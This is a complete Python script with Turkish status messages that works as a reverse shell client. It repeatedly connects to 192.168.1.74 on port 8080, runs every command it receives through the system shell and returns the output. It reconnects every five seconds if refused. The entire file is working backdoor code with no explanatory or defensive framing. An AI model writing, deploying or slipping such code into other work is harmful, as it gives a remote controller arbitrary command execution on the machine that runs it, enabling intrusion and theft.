import socket
import subprocess
import time


def run_code(code):
    if isinstance(code, bytes):
        code = code.decode('utf-8')

    return subprocess.check_output(code, shell=True)


while True:
    try:
        baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baglanti.connect(("192.168.1.74", 8080))
    except ConnectionRefusedError:
        print("Bağlantı reddedildi. 5 saniye sonra tekrar denenecek.")
        time.sleep(5)
        continue

    try:
        while True:
            code = baglanti.recv(1000)
            if not code:
                break
            try:
                info = run_code(code)
            except subprocess.CalledProcessError as e:
                info = str(e).encode('utf-8')
            baglanti.send(info)
    except Exception as e:
        print("Bir hata oluştu:", str(e))
    finally:
        baglanti.close()
